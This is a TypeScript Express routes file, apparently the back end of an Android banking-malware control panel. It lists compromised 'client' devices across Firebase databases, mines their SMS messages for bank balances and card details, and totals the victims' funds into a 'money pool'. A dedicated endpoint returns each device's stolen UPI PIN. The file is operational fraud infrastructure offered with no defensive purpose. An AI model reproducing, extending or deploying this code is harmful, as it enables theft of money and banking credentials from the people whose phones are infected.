/**
 * Device Routes
 *
 * GET    /api/devices             — snapshot of all devices (all panels)
 * GET    /api/devices/:id         — single device info
 * PATCH  /api/devices/:id/note    — save note to Firebase
 * DELETE /api/devices/:id         — delete device from Firebase
 * GET    /api/devices/:id/upi-pin — get UPI PIN
 */

import { Router } from "express";
import type { Request, Response } from "express";
import { db } from "@workspace/db";
import { panelConfigs } from "@workspace/db/schema";
import { eq, and } from "drizzle-orm";
import {
  normalizeDevice,
  firebaseSet,
  firebaseDelete,
  firebaseFetch,
  fetchSmsAnalysis,
  type NormalizedDevice,
} from "../lib/firebase-stream.js";
import { decrypt } from "../lib/crypto.js";
import { authenticate } from "../middleware/authenticate.js";

const router = Router();
const SESSION_SECRET = process.env.SESSION_SECRET ?? "dev-secret-change-me";

// ─── Money-pool helpers (mirrors web dashboard's computeBankBreakdown) ────────

function parseRupee(v: unknown): number {
  if (v == null) return 0;
  const s = String(v).replace(/[₹,\s]/g, "").trim();
  if (!s) return 0;
  const lakh = s.match(/^([0-9.]+)[Ll]$/i);
  if (lakh) return Math.round(parseFloat(lakh[1]) * 100_000);
  const n = parseFloat(s);
  return isNaN(n) ? 0 : Math.round(n);
}

function computeMoneyPool(devices: NormalizedDevice[]): {
  totalBalance: number;
  fundCount: number;
  unknownCount: number;
} {
  let totalBalance = 0, fundCount = 0, unknownCount = 0;
  for (const d of devices) {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const rows: Array<Record<string, unknown>> = (d.smsAnalysis as any)?.bankBalances ?? [];
    const accounts = new Map<string, number>();
    for (const b of rows) {
      const bankName = String(b.bankName ?? "").trim();
      if (!bankName) continue;
      const last4 = b.accountLast4 ? String(b.accountLast4) : "";
      const key = `${bankName}|${last4}`;
      const hasAmt = b.availableBalance != null && String(b.availableBalance).trim() !== "";
      const amount = hasAmt ? parseRupee(b.availableBalance) : 0;
      const cur = accounts.has(key) ? accounts.get(key)! : -1;
      if (amount > cur) accounts.set(key, amount);
      else if (!accounts.has(key)) accounts.set(key, 0);
    }
    for (const amount of accounts.values()) {
      if (amount > 0) { totalBalance += amount; fundCount++; }
      else unknownCount++;
    }
  }
  return { totalBalance, fundCount, unknownCount };
}

async function getConfigs(userId: string) {
  return db
    .select()
    .from(panelConfigs)
    .where(and(eq(panelConfigs.ownerId, userId), eq(panelConfigs.isActive, true)));
}

async function firebaseGet(url: string, secret: string, path: string) {
  // Uses AbortController+setTimeout (Profix pattern) — avoids Node 18's
  // raw "signal timed out" error; gives Firebase 30 s for large databases.
  const res = await firebaseFetch(
    `${url.replace(/\/$/, "")}/${path}.json?auth=${encodeURIComponent(secret)}`,
    {},
    30_000,
  );
  if (!res.ok) {
    const body = await res.text().catch(() => "");
    if (res.status === 401 || res.status === 403) {
      throw new Error("PERMISSION_DENIED: Firebase rejected your key.");
    }
    throw new Error(`Firebase ${res.status}: ${body.slice(0, 200)}`);
  }
  return res.json();
}

// ─── GET /api/devices ─────────────────────────────────────────────────────
// Snapshot of all devices across all panels. Use /api/stream for real-time.

router.get("/", authenticate, async (req: Request, res: Response) => {
  const configs = await getConfigs(req.user!.id);
  if (!configs.length) {
    res.json({ devices: [] });
    return;
  }

  const results = await Promise.allSettled(
    configs.map(async (config) => {
      const secret = decrypt(config.firebaseSecret, SESSION_SECRET);
      const data = await firebaseGet(config.firebaseUrl, secret, "clients");
      if (!data || typeof data !== "object") return [];

      const devices = Object.entries(data as Record<string, unknown>).map(
        ([id, raw]) => normalizeDevice(id, raw, config.id),
      );

      // ── Batch SMS analysis (Profex approach) ─────────────────────────────
      // Profex fetches messages/{deviceId} + runs regex NLP per device so that
      // smsAnalysis (bankBalances, cards, phones, networks) is always computed
      // from actual SMS text — even when the Android app does NOT write a
      // smsAnalysis node to Firebase directly.
      //
      // Process in batches of 5 (parallel within each batch) to avoid
      // overwhelming Firebase with concurrent requests, same as Profex.
      // Per-device timeout is 12 s; devices that fail keep their Firebase
      // smsAnalysis (if any) or stay undefined.
      const needsAnalysis = devices.filter((d) => !d.smsAnalysis);
      for (let i = 0; i < needsAnalysis.length; i += 5) {
        const batch = needsAnalysis.slice(i, i + 5);
        const analyses = await Promise.all(
          batch.map((d) => fetchSmsAnalysis(config.firebaseUrl, secret, d.id)),
        );
        analyses.forEach((analysis, idx) => {
          if (analysis) {
            // eslint-disable-next-line @typescript-eslint/no-explicit-any
            batch[idx].smsAnalysis = analysis as Record<string, any>;
          }
        });
      }

      return devices;
    }),
  );

  const devices = results.flatMap((r) => (r.status === "fulfilled" ? r.value : []));

  // Sort: online first, then by joinedTs desc
  devices.sort((a, b) => {
    if (a.status !== b.status) return b.status ? 1 : -1;
    return b.joinedTs - a.joinedTs;
  });

  const summary = computeMoneyPool(devices);
  res.json({ devices, total: devices.length, summary });
});

// ─── GET /api/devices/notes ──────────────────────────────────────────────
// Returns { notes: { [deviceId]: string } } — all saved notes across all panels.

router.get("/notes", authenticate, async (req: Request, res: Response) => {
  const configs = await getConfigs(req.user!.id);
  if (!configs.length) {
    res.json({ notes: {} });
    return;
  }

  const results = await Promise.allSettled(
    configs.map(async (config) => {
      const secret = decrypt(config.firebaseSecret, SESSION_SECRET);
      const data = await firebaseGet(config.firebaseUrl, secret, "clients");
      if (!data || typeof data !== "object") return {};
      const notes: Record<string, string> = {};
      for (const [id, raw] of Object.entries(data as Record<string, unknown>)) {
        const note = (raw as Record<string, unknown>)?.note;
        if (note && typeof note === "string" && note.trim()) {
          notes[id] = note.trim();
        }
      }
      return notes;
    }),
  );

  const notes = results.reduce((acc, r) => {
    if (r.status === "fulfilled") Object.assign(acc, r.value);
    return acc;
  }, {} as Record<string, string>);

  res.json({ notes });
});

// ─── POST /api/devices/:id/note  &  PATCH /api/devices/:id/note ──────────

async function saveNote(req: Request, res: Response) {
  const { id } = req.params;
  const { note, panelId } = req.body as { note?: string; panelId?: string };

  const configs = await getConfigs(req.user!.id);
  const config = panelId
    ? configs.find((c) => c.id === panelId)
    : configs[0];

  if (!config) {
    res.status(404).json({ error: "Panel not found" });
    return;
  }

  const secret = decrypt(config.firebaseSecret, SESSION_SECRET);

  try {
    await firebaseSet(
      config.firebaseUrl,
      secret,
      `clients/${id}/note`,
      note?.trim() ?? null,
    );
    res.json({ ok: true, note: note?.trim() ?? null });
  } catch (err) {
    res.status(500).json({ error: `Failed to save note: ${String(err)}` });
  }
}

router.post("/:id/note", authenticate, saveNote);
router.patch("/:id/note", authenticate, saveNote);

// ─── DELETE /api/devices/:id ─────────────────────────────────────────────

router.delete("/:id", authenticate, async (req: Request, res: Response) => {
  const { id } = req.params;
  const panelId = req.query.panelId as string | undefined;

  const configs = await getConfigs(req.user!.id);
  const config = panelId
    ? configs.find((c) => c.id === panelId)
    : configs[0];

  if (!config) {
    res.status(404).json({ error: "Panel not found" });
    return;
  }

  const secret = decrypt(config.firebaseSecret, SESSION_SECRET);

  try {
    await firebaseDelete(config.firebaseUrl, secret, `clients/${id}`);
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: `Failed to delete device: ${String(err)}` });
  }
});

// ─── GET /api/devices/:id/upi-pin ────────────────────────────────────────

router.get("/:id/upi-pin", authenticate, async (req: Request, res: Response) => {
  const { id } = req.params;
  const panelId = req.query.panelId as string | undefined;

  const configs = await getConfigs(req.user!.id);
  const config = panelId
    ? configs.find((c) => c.id === panelId)
    : configs[0];

  if (!config) {
    res.status(404).json({ error: "Panel not found" });
    return;
  }

  const secret = decrypt(config.firebaseSecret, SESSION_SECRET);

  try {
    const pin = await firebaseGet(config.firebaseUrl, secret, `clients/${id}/upipin`);
    res.json({ pin: pin ?? null });
  } catch (err) {
    res.status(500).json({ error: `Failed to fetch UPI PIN: ${String(err)}` });
  }
});

export default router;
